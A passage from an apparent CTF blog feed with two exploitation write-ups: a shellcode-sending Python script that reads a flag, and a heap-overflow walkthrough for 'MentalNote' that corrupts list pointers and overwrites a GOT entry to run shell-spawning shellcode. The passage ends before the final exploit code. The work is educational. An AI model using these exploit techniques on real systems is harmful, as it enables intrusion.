</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">5555</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="nb">raw_input</span><span class="p">()</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\xcc</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>raw_input()</code> serves to halt the binary, given us the chance to attach gdb with</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>gdb -pid <span class="sb">`</span>pgrep sbox<span class="sb">`</span>
</span></code></pre></td></tr></table></div></figure>


<p>After attaching, I entered &lsquo;c&rsquo; to continue execution. Then the binary crashes upon hitting the <code>INT 3</code>. The registers look like this, flag is in the same mmapped region:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0xb77c6002 in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="nv">$ </span>i r
</span><span class='line'>eax            0xb77c6000    0xb77c6000
</span><span class='line'>ecx            0xb77c6000    0xb77c6000
</span><span class='line'>edx            0x2000    0x2000
</span><span class='line'>ebx            0xb77a5ff4    0xb77a5ff4
</span><span class='line'>esp            0xbf9eff0c    0xbf9eff0c
</span><span class='line'>ebp            0xbf9eff58    0xbf9eff58
</span><span class='line'>esi            0x0    0x0
</span><span class='line'>edi            0x0    0x0
</span><span class='line'>eip            0xb77c6002    0xb77c6002
</span><span class='line'>eflags         0x207    <span class="o">[</span> CF PF IF <span class="o">]</span>
</span><span class='line'>cs             0x73    0x73
</span><span class='line'>ss             0x7b    0x7b
</span><span class='line'>ds             0x7b    0x7b
</span><span class='line'>es             0x7b    0x7b
</span><span class='line'>fs             0x0    0x0
</span><span class='line'>gs             0x33    0x33
</span><span class='line'>gdb-peda<span class="nv">$ </span>find <span class="s2">&quot;FLAG&quot;</span>
</span><span class='line'>Searching <span class="k">for</span> <span class="s1">&#39;FLAG&#39;</span> in: None ranges
</span><span class='line'>Found <span class="m">2</span> results, display max <span class="m">2</span> items:
</span><span class='line'>    mapped : 0xb77c8000 <span class="o">(</span><span class="s2">&quot;FLAG\n&quot;</span><span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>I whipped up some &lsquo;shellcode&rsquo; (if you can call it that). We can use the values of the registers in our shellcode to write the flag to STDOUT. For instance, <code>ecx</code> already points to the shellcode. We just have to add <code>0x2000</code> to it to get the address of the flag!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 32
</span><span class='line'>
</span><span class='line'>push 0x20     <span class="c"># </span>
</span><span class='line'>pop ebx       <span class="c"># pop 0x20 in ebx</span>
</span><span class='line'>shl ebx, <span class="m">8</span>    <span class="c"># ebx is now 0x2000</span>
</span><span class='line'>              <span class="c"># adjust ecx so that it points to flag in memory</span>
</span><span class='line'>add ecx, ebx  <span class="c"># ecx = buffer</span>
</span><span class='line'>xor ebx, ebx  <span class="c"># ebx = fd</span>
</span><span class='line'>inc ebx       <span class="c"># STDOUT; STDERR also works</span>
</span><span class='line'>xor edx, edx  <span class="c"># edx = count</span>
</span><span class='line'>mov dl, 0xff  <span class="c"># write out 255 bytes</span>
</span><span class='line'>push <span class="m">4</span>        <span class="c"># eax = syscall</span>
</span><span class='line'>pop eax       <span class="c"># eax = write</span>
</span><span class='line'>int 0x80      <span class="c"># get flag!</span>
</span></code></pre></td></tr></table></div></figure>


<p>I avoided null-bytes, just in case. The shellcode was compiled with</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nasm -f bin ./shellcode.asm
</span></code></pre></td></tr></table></div></figure>


<p>I had issues with <code>radare2</code> not recognizing some opcodes (need to look into that!), which is why I switched to <code>nasm</code>. Using a modified version of the earlier python code, I sent the shellcode over to the server:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;54.163.248.69&#39;</span><span class="p">,</span><span class="mi">9001</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;shellcode&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The result:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python sploit.py
</span><span class='line'>d3sp3r4t3_sh3llc0d3
</span></code></pre></td></tr></table></div></figure>


<p>The flag was <code>d3sp3r4t3_sh3llc0d3</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackIM CTF - MentalNote]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mentalnote/"/>
    <updated>2015-01-11T21:40:18+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mentalnote</id>
    <content type="html"><![CDATA[<p><code>mentalnote</code> was a 400 point exploitation-type challenge in NullCon&rsquo;s HackIM CTF.</p>

<!-- more -->


<p></p>

<p>Again, superkojiman started with the invaluable initial reverse engineering. The application is a note-taking program:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>~/tmp/nullcon/exp400$ ./MentalNote 
</span><span class='line'>You want to store some Notes??
</span><span class='line'>Well, we present you the Sherlock's MentalPad --&gt;
</span><span class='line'>Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
</span><span class='line'>NOTE: It has a limit though
</span><span class='line'>Please enter one of the following option:
</span><span class='line'>1 to add a Note.
</span><span class='line'>2 to delete a Note.
</span><span class='line'>3 to edit a Note.
</span><span class='line'>4 to show a Note.
</span><span class='line'>5 to exit.</span></code></pre></td></tr></table></div></figure>


<p>superkojiman pointed out that there were two types of notes. Upon adding a note, the program asks for the type. It looks like the second type is larger. By editing a note as type two, we are able to overflow notes into the next note&rsquo;s meta-data.</p>

<p>First, let&rsquo;s allocate two notes and set them to something to inspect the heap layout.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You want to store some Notes??
</span><span class='line'>Well, we present you the Sherlock's MentalPad --&gt;
</span><span class='line'>Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
</span><span class='line'>NOTE: It has a limit though
</span><span class='line'>Please enter one of the following option:
</span><span class='line'>1 to add a Note.
</span><span class='line'>2 to delete a Note.
</span><span class='line'>3 to edit a Note.
</span><span class='line'>4 to show a Note.
</span><span class='line'>5 to exit.
</span><span class='line'>Your Choice:
</span><span class='line'>1
</span><span class='line'>Give the type of the Note:
</span><span class='line'>1
</span><span class='line'>Please enter one of the following option:
</span><span class='line'>1 to add a Note.
</span><span class='line'>2 to delete a Note.
</span><span class='line'>3 to edit a Note.
</span><span class='line'>4 to show a Note.
</span><span class='line'>5 to exit.
</span><span class='line'>Your Choice:
</span><span class='line'>1
</span><span class='line'>Give the type of the Note:
</span><span class='line'>1
</span><span class='line'>Please enter one of the following option:
</span><span class='line'>1 to add a Note.
</span><span class='line'>2 to delete a Note.
</span><span class='line'>3 to edit a Note.
</span><span class='line'>4 to show a Note.
</span><span class='line'>5 to exit.
</span><span class='line'>Your Choice:
</span><span class='line'>3
</span><span class='line'>Give the Note id to edit:
</span><span class='line'>0
</span><span class='line'>Give the type to edit:
</span><span class='line'>2
</span><span class='line'>Give your Note:
</span><span class='line'>AAAA
</span><span class='line'>Please enter one of the following option:
</span><span class='line'>1 to add a Note.
</span><span class='line'>2 to delete a Note.
</span><span class='line'>3 to edit a Note.
</span><span class='line'>4 to show a Note.
</span><span class='line'>5 to exit.
</span><span class='line'>Your Choice:
</span><span class='line'>3
</span><span class='line'>Give the Note id to edit:
</span><span class='line'>1
</span><span class='line'>Give the type to edit:
</span><span class='line'>2
</span><span class='line'>Give your Note:
</span><span class='line'>BBBB
</span><span class='line'>Please enter one of the following option:</span></code></pre></td></tr></table></div></figure>


<p>I located the second note in the heap using gdb-peda&rsquo;s <code>find</code> command.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ x/60w 0x804d0c0
</span><span class='line'>0x804d0c0:    0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804d0d0:    0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804d0e0:    0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804d0f0:    0x000000e1  0x0804d1d0  0x0804d010  0x42424242
</span><span class='line'>0x804d100:    0x0000000a  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804d110:    0x00000000  0x00000000  0x00000000  0x00000000</span></code></pre></td></tr></table></div></figure>


<p>You can see that there are several pointers stored on the heap. It looks like a doubly-linked list, with pointers to the next and previous notes. The struct that describes this layout would look something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">note</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">note</span> <span class="o">*</span><span class="n">next_note</span><span class="p">;</span>
</span><span class='line'>  <span class="n">note</span> <span class="o">*</span><span class="n">prev_note</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">note_content</span><span class="p">[</span><span class="n">MAX_LENGTH</span><span class="p">];</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>I sent a stupidly large input to overflow these notes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">r</span>
</span><span class='line'><span class="n">You</span> <span class="n">want</span> <span class="n">to</span> <span class="n">store</span> <span class="n">some</span> <span class="n">Notes</span><span class="o">??</span>
</span><span class='line'><span class="n">Well</span><span class="p">,</span> <span class="n">we</span> <span class="n">present</span> <span class="n">you</span> <span class="n">the</span> <span class="n">Sherlock</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">MentalPad</span> <span class="o">--&gt;</span>
</span><span class='line'><span class="n">Sherlock</span> <span class="n">uses</span> <span class="n">Mental</span> <span class="n">Notes</span> <span class="n">to</span> <span class="n">solve</span> <span class="n">the</span> <span class="n">Cases</span> <span class="o">--</span> <span class="n">Now</span> <span class="n">you</span> <span class="n">can</span> <span class="n">use</span> <span class="n">it</span> <span class="n">too</span><span class="p">.</span>
</span><span class='line'><span class="nl">NOTE</span><span class="p">:</span> <span class="n">It</span> <span class="n">has</span> <span class="n">a</span> <span class="n">limit</span> <span class="n">though</span>
</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">one</span> <span class="n">of</span> <span class="n">the</span> <span class="n">following</span> <span class="nl">option</span><span class="p">:</span>
</span><span class='line'><span class="mi">1</span> <span class="n">to</span> <span class="n">add</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">2</span> <span class="n">to</span> <span class="n">delete</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">3</span> <span class="n">to</span> <span class="n">edit</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">4</span> <span class="n">to</span> <span class="n">show</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">5</span> <span class="n">to</span> <span class="n">exit</span><span class="p">.</span>
</span><span class='line'><span class="n">Your</span> <span class="nl">Choice</span><span class="p">:</span>
</span><span class='line'><span class="mi">1</span>
</span><span class='line'><span class="n">Give</span> <span class="n">the</span> <span class="n">type</span> <span class="n">of</span> <span class="n">the</span> <span class="nl">Note</span><span class="p">:</span>
</span><span class='line'><span class="mi">1</span>
</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">one</span> <span class="n">of</span> <span class="n">the</span> <span class="n">following</span> <span class="nl">option</span><span class="p">:</span>
</span><span class='line'><span class="mi">1</span> <span class="n">to</span> <span class="n">add</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">2</span> <span class="n">to</span> <span class="n">delete</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">3</span> <span class="n">to</span> <span class="n">edit</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">4</span> <span class="n">to</span> <span class="n">show</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">5</span> <span class="n">to</span> <span class="n">exit</span><span class="p">.</span>
</span><span class='line'><span class="n">Your</span> <span class="nl">Choice</span><span class="p">:</span>
</span><span class='line'><span class="mi">1</span>
</span><span class='line'><span class="n">Give</span> <span class="n">the</span> <span class="n">type</span> <span class="n">of</span> <span class="n">the</span> <span class="nl">Note</span><span class="p">:</span>
</span><span class='line'><span class="mi">1</span>
</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">one</span> <span class="n">of</span> <span class="n">the</span> <span class="n">following</span> <span class="nl">option</span><span class="p">:</span>
</span><span class='line'><span class="mi">1</span> <span class="n">to</span> <span class="n">add</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">2</span> <span class="n">to</span> <span class="n">delete</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">3</span> <span class="n">to</span> <span class="n">edit</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">4</span> <span class="n">to</span> <span class="n">show</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">5</span> <span class="n">to</span> <span class="n">exit</span><span class="p">.</span>
</span><span class='line'><span class="n">Your</span> <span class="nl">Choice</span><span class="p">:</span>
</span><span class='line'><span class="mi">3</span>
</span><span class='line'><span class="n">Give</span> <span class="n">the</span> <span class="n">Note</span> <span class="n">id</span> <span class="n">to</span> <span class="nl">edit</span><span class="p">:</span>
</span><span class='line'><span class="mi">0</span>
</span><span class='line'><span class="n">Give</span> <span class="n">the</span> <span class="n">type</span> <span class="n">to</span> <span class="nl">edit</span><span class="p">:</span>
</span><span class='line'><span class="mi">2</span>
</span><span class='line'><span class="n">Give</span> <span class="n">your</span> <span class="nl">Note</span><span class="p">:</span>
</span><span class='line'><span class="n">AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBB</span>
</span></code></pre></td></tr></table></div></figure>


<p>The heap for note two now looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">60</span><span class="n">wx</span> <span class="mh">0x804d0c0</span>
</span><span class='line'><span class="mh">0x804d0c0</span><span class="o">:</span> <span class="mh">0x46464646</span>  <span class="mh">0x47474747</span>  <span class="mh">0x48484848</span>  <span class="mh">0x49494949</span>
</span><span class='line'><span class="mh">0x804d0d0</span><span class="o">:</span> <span class="mh">0x4a4a4a4a</span>  <span class="mh">0x4b4b4b4b</span>  <span class="mh">0x4c4c4c4c</span>  <span class="mh">0x4d4d4d4d</span>
</span><span class='line'><span class="mh">0x804d0e0</span><span class="o">:</span> <span class="mh">0x4e4e4e4e</span>  <span class="mh">0x4f4f4f4f</span>  <span class="mh">0x50505050</span>  <span class="mh">0x51515151</span>
</span><span class='line'><span class="mh">0x804d0f0</span><span class="o">:</span> <span class="mh">0x52525252</span>  <span class="mh">0x41414141</span>  <span class="mh">0x42424242</span>  <span class="mh">0x4242420a</span>
</span><span class='line'><span class="mh">0x804d100</span><span class="o">:</span> <span class="mh">0x0000000a</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span></code></pre></td></tr></table></div></figure>


<p>We have overwritten the pointers. Furthermore, superkojiman noticed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">vmmap</span>
</span><span class='line'><span class="n">Start</span>      <span class="n">End</span>        <span class="n">Perm</span>   <span class="n">Name</span>
</span><span class='line'><span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x0804c000</span> <span class="mh">0x0804e000</span> <span class="n">rwxp</span> <span class="p">[</span><span class="n">heap</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>The heap is writeable <strong>and</strong> executable. This allows us to store shellcode on the heap. Now to find a way to get the heap address reliably (ASLR is enabled) and overwrite a GOT pointer with the location of our shellcode.</p>

<p>I recently tested c0ne&rsquo;s binaries for his Pandora&rsquo;s Box VM. I did one of the challenges in a similar way: overflow a buffer up to a certain pointer to grab extra bytes when that buffer is printed. I could leak the heap address by sending just enough bytes into note one to make the heap look like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">60</span><span class="n">wx</span> <span class="mh">0x804d0c0</span>
</span><span class='line'><span class="mh">0x804d0c0</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804d0d0</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804d0e0</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804d0f0</span><span class="o">:</span> <span class="mh">0x4242420a</span>  <span class="mh">0x0804d1d0</span>  <span class="mh">0x0804d010</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804d100</span><span class="o">:</span> <span class="mh">0x0000000a</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804d110</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span></code></pre></td></tr></table></div></figure>


<p>When I know requested the value of note one, the binary would dump out lots of B&rsquo;s, but also append the pointers from the heap! With that sorted, I could find my shellcode on the heap even with ASLR enabled. Next was overwriting a GOT pointer. This was done by overflowing a note and overwriting the pointers to <code>next_note</code> and <code>prev_note</code>. Then I&rsquo;d ask the binary to delete a note. It does this by calling <code>free()</code>. Because we can control the two pointers, we have a write-what-where primitive. By setting the right values, I could write the address of the shellcode on the heap to <code>__isoc99_scanf@got.plt</code>. Initially, I swapped the two memory addresses around, leading to mangled shellcode. After overwriting the GOT pointer of <code>__isoc99_scanf@got.plt</code>, which is one of the next functions the binary calls in its main loop, the shellcode on the heap is executed. Because of the way <code>free()</code> works, we need to adjust the addresses a bit.</p>

<p>The <a href="http://www.shell-storm.org/shellcode/files/shellcode-547.php">shellcode</a> was modified a bit (&lsquo;/bin/ash&rsquo; -> &lsquo;/bin//sh&rsquo;) and stored on the heap. The overflow was used to overwrite the two pointers, and the write-what-where is triggered by sending a &lsquo;delete note&rsquo; command.</p>

<p>The exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
